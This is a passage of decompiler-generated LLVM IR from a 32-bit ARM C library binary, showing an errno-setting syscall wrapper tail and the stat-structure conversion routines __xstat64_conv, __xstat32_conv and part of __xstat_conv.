  store i32 %v0_1c4c0, i32* @r3, align 4
  %v0_1c4d0 = load i32, i32* @r0, align 4
  store i32 %v0_1c4d0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1c4d0, -4095
  br i1 %tmp, label %dec_label_pc_1c4f0, label %dec_label_pc_1c4dc

dec_label_pc_1c4dc:                               ; preds = %entry
  %v0_1c4dc = call i32 @__GI___errno_location()
  %v0_1c4e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c4e0 = sub i32 0, %v0_1c4e0
  store i32 %v1_1c4e0, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1c4e8 = inttoptr i32 %v0_1c4dc to i32*
  store i32 %v1_1c4e0, i32* %v2_1c4e8, align 4
  br label %dec_label_pc_1c500

dec_label_pc_1c4f0:                               ; preds = %entry
  %v2_1c4f0 = icmp eq i32 %v0_1c4d0, 0
  br i1 %v2_1c4f0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1c4f0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1c4f0, %bb
  call void @__pseudo_cond_branch(i1 %v2_1c4f0, i32 ptrtoint (i32* @global_var_1c688.1214 to i32))
  br label %dec_label_pc_1c500

dec_label_pc_1c500:                               ; preds = %dec_label_pc_1c4dc, %.thread
  %v0_1c500 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1c500

; uselistorder directives
  uselistorder i32 %v0_1c4d0, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1c500, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1c510 = load i32, i32* @r4, align 4
  store i32 %v3_1c510, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_1c528 = inttoptr i32 %arg2 to i8*
  %v3_1c528 = call i32 @__GI_memset(i8* %v2_1c528, i32 0)
  %v2_1c52c = load i32, i32* %arg1, align 4
  store i32 %v2_1c52c, i32* %r3.global-to-local, align 4
  %v3_1c52c = add i32 %tmp, 4
  %v4_1c52c = inttoptr i32 %v3_1c52c to i32*
  %v5_1c52c = load i32, i32* %v4_1c52c, align 4
  store i32 %v5_1c52c, i32* %r4.global-to-local, align 4
  %v0_1c530 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c530 = inttoptr i32 %v0_1c530 to i32*
  store i32 %v2_1c52c, i32* %v1_1c530, align 4
  %v3_1c530 = add i32 %v0_1c530, 4
  %v4_1c530 = inttoptr i32 %v3_1c530 to i32*
  %v5_1c530 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1c530, i32* %v4_1c530, align 4
  %v0_1c534 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c534 = add i32 %v0_1c534, 12
  %v2_1c534 = inttoptr i32 %v1_1c534 to i32*
  %v3_1c534 = load i32, i32* %v2_1c534, align 4
  %v1_1c538 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c538 = add i32 %v1_1c538, 12
  %v3_1c538 = inttoptr i32 %v2_1c538 to i32*
  store i32 %v3_1c534, i32* %v3_1c538, align 4
  %v0_1c53c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c53c = add i32 %v0_1c53c, 96
  store i32 %v1_1c53c, i32* %r3.global-to-local, align 4
  %v1_1c540 = inttoptr i32 %v1_1c53c to i32*
  %v2_1c540 = load i32, i32* %v1_1c540, align 4
  store i32 %v2_1c540, i32* %r3.global-to-local, align 4
  %v3_1c540 = add i32 %v0_1c53c, 100
  %v4_1c540 = inttoptr i32 %v3_1c540 to i32*
  %v5_1c540 = load i32, i32* %v4_1c540, align 4
  store i32 %v5_1c540, i32* %r4.global-to-local, align 4
  %v1_1c544 = add i32 %v0_1c53c, 56
  %v2_1c544 = inttoptr i32 %v1_1c544 to i32*
  %v3_1c544 = load i32, i32* %v2_1c544, align 4
  store i32 %v3_1c544, i32* %r2.global-to-local, align 4
  %v1_1c548 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c548 = add i32 %v1_1c548, 96
  %v3_1c548 = inttoptr i32 %v2_1c548 to i32*
  store i32 %v2_1c540, i32* %v3_1c548, align 4
  %v0_1c54c = load i32, i32* %r4.global-to-local, align 4
  %v1_1c54c = load i32, i32* %r5.global-to-local, align 4
  %v2_1c54c = add i32 %v1_1c54c, 100
  %v3_1c54c = inttoptr i32 %v2_1c54c to i32*
  store i32 %v0_1c54c, i32* %v3_1c54c, align 4
  %v0_1c550 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c550 = add i32 %v0_1c550, 24
  store i32 %v1_1c550, i32* %ip.global-to-local, align 4
  %v1_1c554 = inttoptr i32 %v1_1c550 to i32*
  %v2_1c554 = load i32, i32* %v1_1c554, align 4
  store i32 %v2_1c554, i32* %ip.global-to-local, align 4
  %v3_1c554 = add i32 %v0_1c550, 28
  %v4_1c554 = inttoptr i32 %v3_1c554 to i32*
  %v5_1c554 = load i32, i32* %v4_1c554, align 4
  store i32 %v5_1c554, i32* %lr.global-to-local, align 4
  %v0_1c558 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c558 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c558 = add i32 %v1_1c558, 56
  %v3_1c558 = inttoptr i32 %v2_1c558 to i32*
  store i32 %v0_1c558, i32* %v3_1c558, align 4
  %v0_1c55c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c55c = add i32 %v0_1c55c, 72
  store i32 %v1_1c55c, i32* %r3.global-to-local, align 4
  %v1_1c560 = add i32 %v0_1c55c, 32
  store i32 %v1_1c560, i32* %r7.global-to-local, align 4
  %v1_1c564 = inttoptr i32 %v1_1c560 to i32*
  %v2_1c564 = load i32, i32* %v1_1c564, align 4
  store i32 %v2_1c564, i32* %r7.global-to-local, align 4
  %v3_1c564 = add i32 %v0_1c55c, 36
  %v4_1c564 = inttoptr i32 %v3_1c564 to i32*
  %v5_1c564 = load i32, i32* %v4_1c564, align 4
  store i32 %v5_1c564, i32* %r8.global-to-local, align 4
  %v1_1c568 = inttoptr i32 %v1_1c55c to i32*
  %v2_1c568 = load i32, i32* %v1_1c568, align 4
  %v3_1c568 = add i32 %v0_1c55c, 76
  %v4_1c568 = inttoptr i32 %v3_1c568 to i32*
  %v5_1c568 = load i32, i32* %v4_1c568, align 4
  store i32 %v5_1c568, i32* %r1.global-to-local, align 4
  %v0_1c56c = load i32, i32* %r5.global-to-local, align 4
  %v1_1c56c = add i32 %v0_1c56c, 72
  %v1_1c570 = inttoptr i32 %v1_1c56c to i32*
  store i32 %v2_1c568, i32* %v1_1c570, align 4
  %v3_1c570 = add i32 %v0_1c56c, 76
  %v4_1c570 = inttoptr i32 %v3_1c570 to i32*
  %v5_1c570 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c570, i32* %v4_1c570, align 4
  %v0_1c574 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c574 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c574 = add i32 %v1_1c574, 32
  %v3_1c574 = inttoptr i32 %v2_1c574 to i32*
  store i32 %v0_1c574, i32* %v3_1c574, align 4
  %v0_1c578 = load i32, i32* %r8.global-to-local, align 4
  %v1_1c578 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c578 = add i32 %v1_1c578, 36
  %v3_1c578 = inttoptr i32 %v2_1c578 to i32*
  store i32 %v0_1c578, i32* %v3_1c578, align 4
  %v0_1c57c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c57c = add i32 %v0_1c57c, 80
  store i32 %v1_1c57c, i32* %r3.global-to-local, align 4
  %v1_1c580 = add i32 %v0_1c57c, 48
  store i32 %v1_1c580, i32* %r7.global-to-local, align 4
  %v1_1c584 = inttoptr i32 %v1_1c580 to i32*
  %v2_1c584 = load i32, i32* %v1_1c584, align 4
  store i32 %v2_1c584, i32* %r7.global-to-local, align 4
  %v3_1c584 = add i32 %v0_1c57c, 52
  %v4_1c584 = inttoptr i32 %v3_1c584 to i32*
  %v5_1c584 = load i32, i32* %v4_1c584, align 4
  store i32 %v5_1c584, i32* %r8.global-to-local, align 4
  %v1_1c588 = inttoptr i32 %v1_1c57c to i32*
  %v2_1c588 = load i32, i32* %v1_1c588, align 4
  %v3_1c588 = add i32 %v0_1c57c, 84
  %v4_1c588 = inttoptr i32 %v3_1c588 to i32*
  %v5_1c588 = load i32, i32* %v4_1c588, align 4
  store i32 %v5_1c588, i32* %r1.global-to-local, align 4
  %v1_1c58c = add i32 %v0_1c57c, 16
  %v2_1c58c = inttoptr i32 %v1_1c58c to i32*
  %v3_1c58c = load i32, i32* %v2_1c58c, align 4
  store i32 %v3_1c58c, i32* %r2.global-to-local, align 4
  %v0_1c590 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c590 = add i32 %v0_1c590, 80
  %v1_1c594 = inttoptr i32 %v1_1c590 to i32*
  store i32 %v2_1c588, i32* %v1_1c594, align 4
  %v3_1c594 = add i32 %v0_1c590, 84
  %v4_1c594 = inttoptr i32 %v3_1c594 to i32*
  %v5_1c594 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c594, i32* %v4_1c594, align 4
  %v0_1c598 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c598 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c598 = add i32 %v1_1c598, 48
  %v3_1c598 = inttoptr i32 %v2_1c598 to i32*
  store i32 %v0_1c598, i32* %v3_1c598, align 4
  %v0_1c59c = load i32, i32* %r8.global-to-local, align 4
  %v1_1c59c = load i32, i32* %r5.global-to-local, align 4
  %v2_1c59c = add i32 %v1_1c59c, 52
  %v3_1c59c = inttoptr i32 %v2_1c59c to i32*
  store i32 %v0_1c59c, i32* %v3_1c59c, align 4
  %v0_1c5a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c5a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5a0 = add i32 %v1_1c5a0, 16
  %v3_1c5a0 = inttoptr i32 %v2_1c5a0 to i32*
  store i32 %v0_1c5a0, i32* %v3_1c5a0, align 4
  %v0_1c5a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c5a4 = add i32 %v0_1c5a4, 88
  store i32 %v1_1c5a4, i32* %r3.global-to-local, align 4
  %v1_1c5a8 = add i32 %v0_1c5a4, 20
  %v2_1c5a8 = inttoptr i32 %v1_1c5a8 to i32*
  %v3_1c5a8 = load i32, i32* %v2_1c5a8, align 4
  store i32 %v3_1c5a8, i32* %r2.global-to-local, align 4
  %v1_1c5ac = inttoptr i32 %v1_1c5a4 to i32*
  %v2_1c5ac = load i32, i32* %v1_1c5ac, align 4
  %v3_1c5ac = add i32 %v0_1c5a4, 92
  %v4_1c5ac = inttoptr i32 %v3_1c5ac to i32*
  %v5_1c5ac = load i32, i32* %v4_1c5ac, align 4
  store i32 %v5_1c5ac, i32* %r1.global-to-local, align 4
  %v1_1c5b0 = add i32 %v0_1c5a4, 64
  store i32 %v1_1c5b0, i32* %r6.global-to-local, align 4
  %v1_1c5b4 = inttoptr i32 %v1_1c5b0 to i32*
  %v2_1c5b4 = load i32, i32* %v1_1c5b4, align 4
  store i32 %v2_1c5b4, i32* %r6.global-to-local, align 4
  %v3_1c5b4 = add i32 %v0_1c5a4, 68
  %v4_1c5b4 = inttoptr i32 %v3_1c5b4 to i32*
  %v5_1c5b4 = load i32, i32* %v4_1c5b4, align 4
  store i32 %v5_1c5b4, i32* %r7.global-to-local, align 4
  %v0_1c5b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c5b8 = add i32 %v0_1c5b8, 88
  store i32 %v1_1c5b8, i32* %r3.global-to-local, align 4
  %v2_1c5bc = add i32 %v0_1c5b8, 20
  %v3_1c5bc = inttoptr i32 %v2_1c5bc to i32*
  store i32 %v3_1c5a8, i32* %v3_1c5bc, align 4
  %v0_1c5c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c5c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5c0 = add i32 %v1_1c5c0, 24
  %v3_1c5c0 = inttoptr i32 %v2_1c5c0 to i32*
  store i32 %v0_1c5c0, i32* %v3_1c5c0, align 4
  %v0_1c5c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_1c5c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5c4 = add i32 %v1_1c5c4, 28
  %v3_1c5c4 = inttoptr i32 %v2_1c5c4 to i32*
  store i32 %v0_1c5c4, i32* %v3_1c5c4, align 4
  %v0_1c5c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c5c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5c8 = add i32 %v1_1c5c8, 64
  %v3_1c5c8 = inttoptr i32 %v2_1c5c8 to i32*
  store i32 %v0_1c5c8, i32* %v3_1c5c8, align 4
  %v0_1c5cc = load i32, i32* %r7.global-to-local, align 4
  %v1_1c5cc = load i32, i32* %r5.global-to-local, align 4
  %v2_1c5cc = add i32 %v1_1c5cc, 68
  %v3_1c5cc = inttoptr i32 %v2_1c5cc to i32*
  store i32 %v0_1c5cc, i32* %v3_1c5cc, align 4
  %v0_1c5d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c5d0 = inttoptr i32 %v0_1c5d0 to i32*
  store i32 %v2_1c5ac, i32* %v1_1c5d0, align 4
  %v3_1c5d0 = add i32 %v0_1c5d0, 4
  %v4_1c5d0 = inttoptr i32 %v3_1c5d0 to i32*
  %v5_1c5d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c5d0, i32* %v4_1c5d0, align 4
  %v2_1c5d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1c5d4, i32* %r4.global-to-local, align 4
  ret i32 %v2_1c5ac

; uselistorder directives
  uselistorder i32 %v0_1c5a4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1c57c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 2, 0, 1, 3 }
  uselistorder i32 104, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1c5dc = load i32, i32* @r4, align 4
  store i32 %v3_1c5dc, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1c5f4 = inttoptr i32 %arg2 to i8*
  %v3_1c5f4 = call i32 @__GI_memset(i8* %v2_1c5f4, i32 0)
  %v2_1c5f8 = load i32, i32* %arg1, align 4
  %v3_1c5f8 = add i32 %tmp, 4
  %v4_1c5f8 = inttoptr i32 %v3_1c5f8 to i32*
  %v5_1c5f8 = load i32, i32* %v4_1c5f8, align 4
  store i32 %v5_1c5f8, i32* %r4.global-to-local, align 4
  %v0_1c5fc = load i32, i32* %r6.global-to-local, align 4
  %v1_1c5fc = inttoptr i32 %v0_1c5fc to i32*
  store i32 %v2_1c5f8, i32* %v1_1c5fc, align 4
  %v3_1c5fc = add i32 %v0_1c5fc, 4
  %v4_1c5fc = inttoptr i32 %v3_1c5fc to i32*
  %v5_1c5fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1c5fc, i32* %v4_1c5fc, align 4
  %v0_1c600 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c600 = add i32 %v0_1c600, 32
  %v1_1c604 = inttoptr i32 %v1_1c600 to i32*
  %v2_1c604 = load i32, i32* %v1_1c604, align 4
  %v3_1c604 = add i32 %v0_1c600, 36
  %v4_1c604 = inttoptr i32 %v3_1c604 to i32*
  %v5_1c604 = load i32, i32* %v4_1c604, align 4
  store i32 %v5_1c604, i32* %r4.global-to-local, align 4
  %v1_1c608 = add i32 %v0_1c600, 96
  %v2_1c608 = inttoptr i32 %v1_1c608 to i32*
  %v3_1c608 = load i32, i32* %v2_1c608, align 4
  store i32 %v3_1c608, i32* %r2.global-to-local, align 4
  %v1_1c60c = load i32, i32* %r6.global-to-local, align 4
  %v2_1c60c = add i32 %v1_1c60c, 32
  %v3_1c60c = inttoptr i32 %v2_1c60c to i32*
  store i32 %v2_1c604, i32* %v3_1c60c, align 4
  %v0_1c610 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c610 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c610 = add i32 %v1_1c610, 36
  %v3_1c610 = inttoptr i32 %v2_1c610 to i32*
  store i32 %v0_1c610, i32* %v3_1c610, align 4
  %v0_1c614 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c614 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c614 = add i32 %v1_1c614, 12
  %v3_1c614 = inttoptr i32 %v2_1c614 to i32*
  store i32 %v0_1c614, i32* %v3_1c614, align 4
  %v0_1c618 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c618 = add i32 %v0_1c618, 48
  %v2_1c618 = inttoptr i32 %v1_1c618 to i32*
  %v3_1c618 = load i32, i32* %v2_1c618, align 4
  %v1_1c61c = add i32 %v0_1c618, 24
  store i32 %v1_1c61c, i32* %ip.global-to-local, align 4
  %v1_1c620 = inttoptr i32 %v1_1c61c to i32*
  %v2_1c620 = load i32, i32* %v1_1c620, align 4
  store i32 %v2_1c620, i32* %ip.global-to-local, align 4
  %v3_1c620 = add i32 %v0_1c618, 28
  %v4_1c620 = inttoptr i32 %v3_1c620 to i32*
  %v5_1c620 = load i32, i32* %v4_1c620, align 4
  store i32 %v5_1c620, i32* %lr.global-to-local, align 4
  %v1_1c624 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c624 = add i32 %v1_1c624, 44
  %v3_1c624 = inttoptr i32 %v2_1c624 to i32*
  store i32 %v3_1c618, i32* %v3_1c624, align 4
  %v0_1c628 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c628 = add i32 %v0_1c628, 64
  %v2_1c628 = inttoptr i32 %v1_1c628 to i32*
  %v3_1c628 = load i32, i32* %v2_1c628, align 4
  %v1_1c62c = add i32 %v0_1c628, 56
  %v2_1c62c = inttoptr i32 %v1_1c62c to i32*
  %v3_1c62c = load i32, i32* %v2_1c62c, align 4
  store i32 %v3_1c62c, i32* %r2.global-to-local, align 4
  %v1_1c630 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c630 = add i32 %v1_1c630, 52
  %v3_1c630 = inttoptr i32 %v2_1c630 to i32*
  store i32 %v3_1c628, i32* %v3_1c630, align 4
  %v0_1c634 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c634 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c634 = add i32 %v1_1c634, 48
  %v3_1c634 = inttoptr i32 %v2_1c634 to i32*
  store i32 %v0_1c634, i32* %v3_1c634, align 4
  %v0_1c638 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c638 = add i32 %v0_1c638, 72
  %v1_1c63c = inttoptr i32 %v1_1c638 to i32*
  %v2_1c63c = load i32, i32* %v1_1c63c, align 4
  %v3_1c63c = add i32 %v0_1c638, 76
  %v4_1c63c = inttoptr i32 %v3_1c63c to i32*
  %v5_1c63c = load i32, i32* %v4_1c63c, align 4
  store i32 %v5_1c63c, i32* %r1.global-to-local, align 4
  %v0_1c640 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c640 = add i32 %v0_1c640, 56
  %v1_1c644 = inttoptr i32 %v1_1c640 to i32*
  store i32 %v2_1c63c, i32* %v1_1c644, align 4
  %v3_1c644 = add i32 %v0_1c640, 60
  %v4_1c644 = inttoptr i32 %v3_1c644 to i32*
  %v5_1c644 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c644, i32* %v4_1c644, align 4
  %v0_1c648 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c648 = add i32 %v0_1c648, 80
  %v1_1c64c = inttoptr i32 %v1_1c648 to i32*
  %v2_1c64c = load i32, i32* %v1_1c64c, align 4
  %v3_1c64c = add i32 %v0_1c648, 84
  %v4_1c64c = inttoptr i32 %v3_1c64c to i32*
  %v5_1c64c = load i32, i32* %v4_1c64c, align 4
  store i32 %v5_1c64c, i32* %r1.global-to-local, align 4
  %v0_1c650 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c650 = add i32 %v0_1c650, 64
  %v1_1c654 = inttoptr i32 %v1_1c650 to i32*
  store i32 %v2_1c64c, i32* %v1_1c654, align 4
  %v3_1c654 = add i32 %v0_1c650, 68
  %v4_1c654 = inttoptr i32 %v3_1c654 to i32*
  %v5_1c654 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c654, i32* %v4_1c654, align 4
  %v0_1c658 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c658 = add i32 %v0_1c658, 16
  %v2_1c658 = inttoptr i32 %v1_1c658 to i32*
  %v3_1c658 = load i32, i32* %v2_1c658, align 4
  %v1_1c65c = load i32, i32* %r6.global-to-local, align 4
  %v2_1c65c = add i32 %v1_1c65c, 16
  %v3_1c65c = inttoptr i32 %v2_1c65c to i32*
  store i32 %v3_1c658, i32* %v3_1c65c, align 4
  %v0_1c660 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c660 = add i32 %v0_1c660, 88
  %v1_1c664 = add i32 %v0_1c660, 20
  %v2_1c664 = inttoptr i32 %v1_1c664 to i32*
  %v3_1c664 = load i32, i32* %v2_1c664, align 4
  store i32 %v3_1c664, i32* %r2.global-to-local, align 4
  %v1_1c668 = inttoptr i32 %v1_1c660 to i32*
  %v2_1c668 = load i32, i32* %v1_1c668, align 4
  %v3_1c668 = add i32 %v0_1c660, 92
  %v4_1c668 = inttoptr i32 %v3_1c668 to i32*
  %v5_1c668 = load i32, i32* %v4_1c668, align 4
  store i32 %v5_1c668, i32* %r1.global-to-local, align 4
  %v0_1c66c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c66c = add i32 %v0_1c66c, 72
  %v1_1c670 = inttoptr i32 %v1_1c66c to i32*
  store i32 %v2_1c668, i32* %v1_1c670, align 4
  %v3_1c670 = add i32 %v0_1c66c, 76
  %v4_1c670 = inttoptr i32 %v3_1c670 to i32*
  %v5_1c670 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c670, i32* %v4_1c670, align 4
  %v0_1c674 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c674 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c674 = add i32 %v1_1c674, 20
  %v3_1c674 = inttoptr i32 %v2_1c674 to i32*
  store i32 %v0_1c674, i32* %v3_1c674, align 4
  %v0_1c678 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c678 = load i32, i32* %r6.global-to-local, align 4
  %v2_1c678 = add i32 %v1_1c678, 24
  %v3_1c678 = inttoptr i32 %v2_1c678 to i32*
  store i32 %v0_1c678, i32* %v3_1c678, align 4
  %v0_1c67c = load i32, i32* %lr.global-to-local, align 4
  %v1_1c67c = load i32, i32* %r6.global-to-local, align 4
  %v2_1c67c = add i32 %v1_1c67c, 28
  %v3_1c67c = inttoptr i32 %v2_1c67c to i32*
  store i32 %v0_1c67c, i32* %v3_1c67c, align 4
  %v2_1c680 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1c680, i32* %r4.global-to-local, align 4
  ret i32 %v2_1c668

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32 84, { 1, 2, 0, 3, 4 }
  uselistorder i32 96, { 2, 3, 4, 6, 7, 0, 1, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1c6a4 = inttoptr i32 %arg2 to i8*
  %v3_1c6a4 = call i32 @__GI_memset(i8* %v2_1c6a4, i32 0)
  %v1_1c6a8 = add i32 %tmp, 4
  %v2_1c6a8 = inttoptr i32 %v1_1c6a8 to i32*
  %v3_1c6a8 = load i32, i32* %v2_1c6a8, align 4
  %v2_1c6ac = load i32, i32* %arg1, align 4
  store i32 %v2_1c6ac, i32* %r8.global-to-local, align 4
  %v1_1c6b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c6b0 = add i32 %v1_1c6b0, 12
  %v3_1c6b0 = inttoptr i32 %v2_1c6b0 to i32*
  store i32 %v3_1c6a8, i32* %v3_1c6b0, align 4
  %v0_1c6b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6b4 = add i32 %v0_1c6b4, 20
  %v2_1c6b4 = inttoptr i32 %v1_1c6b4 to i32*
  %v3_1c6b4 = load i32, i32* %v2_1c6b4, align 4
  %v1_1c6b8 = add i32 %v0_1c6b4, 16
  %v2_1c6b8 = inttoptr i32 %v1_1c6b8 to i32*
  %v3_1c6b8 = load i32, i32* %v2_1c6b8, align 4
  store i32 %v3_1c6b8, i32* %r6.global-to-local, align 4
  %v1_1c6bc = load i32, i32* %r5.global-to-local, align 4
  %v2_1c6bc = add i32 %v1_1c6bc, 44
  %v3_1c6bc = inttoptr i32 %v2_1c6bc to i32*
  store i32 %v3_1c6b4, i32* %v3_1c6bc, align 4
  %v0_1c6c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6c0 = add i32 %v0_1c6c0, 24
  %v2_1c6c0 = inttoptr i32 %v1_1c6c0 to i32*
  %v3_1c6c0 = load i32, i32* %v2_1c6c0, align 4
  %v1_1c6c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c6c4 = add i32 %v1_1c6c4, 48
  %v3_1c6c4 = inttoptr i32 %v2_1c6c4 to i32*
  store i32 %v3_1c6c0, i32* %v3_1c6c4, align 4
  %v0_1c6c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6c8 = add i32 %v0_1c6c8, 28
  %v2_1c6c8 = inttoptr i32 %v1_1c6c8 to i32*
  %v3_1c6c8 = load i32, i32* %v2_1c6c8, align 4
  %v1_1c6cc = load i32, i32* %r5.global-to-local, align 4
  %v2_1c6cc = add i32 %v1_1c6cc, 52
  %v3_1c6cc = inttoptr i32 %v2_1c6cc to i32*
  store i32 %v3_1c6c8, i32* %v3_1c6cc, align 4
  %v0_1c6d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6d0 = add i32 %v0_1c6d0, 32
  %v1_1c6d4 = inttoptr i32 %v1_1c6d0 to i32*
  %v2_1c6d4 = load i32, i32* %v1_1c6d4, align 4
  %v3_1c6d4 = add i32 %v0_1c6d0, 36
  %v4_1c6d4 = inttoptr i32 %v3_1c6d4 to i32*
  %v5_1c6d4 = load i32, i32* %v4_1c6d4, align 4
  store i32 %v5_1c6d4, i32* %r1.global-to-local, align 4
  %v0_1c6d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c6d8 = add i32 %v0_1c6d8, 56
  %v1_1c6dc = inttoptr i32 %v1_1c6d8 to i32*
  store i32 %v2_1c6d4, i32* %v1_1c6dc, align 4
  %v3_1c6dc = add i32 %v0_1c6d8, 60
  %v4_1c6dc = inttoptr i32 %v3_1c6dc to i32*
  %v5_1c6dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c6dc, i32* %v4_1c6dc, align 4
  %v0_1c6e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1c6e0 = add i32 %v0_1c6e0, 40
  %v1_1c6e4 = inttoptr i32 %v1_1c6e0 to i32*
  %v2_1c6e4 = load i32, i32* %v1_1c6e4, align 4
